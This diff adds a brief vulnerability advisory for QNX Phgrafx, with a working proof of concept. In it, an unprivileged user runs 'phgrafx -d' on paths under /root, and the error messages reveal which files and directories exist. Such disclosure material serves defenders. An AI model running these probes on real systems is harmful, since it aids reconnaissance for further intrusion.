@@ -1,0 +1,24 @@
+source: www.securityfocus.com/bid/66098/info
+
+QNX Phgrafx is prone to a file-enumeration weakness.
+
+An attacker can exploit this issue to enumerate the files present in the system's root directory; this may aid in further attacks.
+
+QNX 6.5.0 SP1, 6.5.0, 6.4.1, 6.3.0, and 6.2.0 are vulnerable; other versions may also be affected. 
+
+$ id
+uid=100(user) gid=100
+
+# directory /root/.ph exists:
+$ /usr/photon/bin/phgrafx -d /root/.ph
+load_display_conf(): No such file or directory
+
+# file /root/.profile exsts:
+$ /usr/photon/bin/phgrafx -d /root/.profile
+/root/.profile: opendir(): Not a directory
+load_display_conf(): Not a directory
+
+# /root/doesnotexist does not exist:
+$ /usr/photon/bin/phgrafx -d /root/doesnotexist
+/root/doesnotexist: opendir(): No such file or directory
+load_display_conf(): No such file or directory
